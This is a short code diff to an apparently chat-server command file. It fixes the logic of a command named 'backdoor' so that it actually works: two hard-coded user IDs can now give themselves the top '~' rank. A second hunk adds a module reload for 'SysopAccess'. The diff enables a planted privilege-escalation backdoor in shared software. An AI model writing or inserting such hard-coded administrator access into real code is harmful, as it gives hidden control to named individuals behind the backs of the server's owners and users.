@@ -352,7 +352,7 @@ var components = exports.components = {
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'creaturephil' || user.userid !== 'blakjack') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'creaturephil' && user.userid !== 'blakjack') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -649,6 +649,10 @@ var components = exports.components = {
             this.sendReply('Reloading Components...');
             CommandParser.uncacheTree(path.join(__dirname, './', './components.js'));
             Components = require(path.join(__dirname, './', './components.js'));
+
+            this.sendReply('Reloading SysopAccess...');
+            CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
+            SysopAccess = require(path.join(__dirname, './', './core.js'));
 
             return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
         } catch (e) {
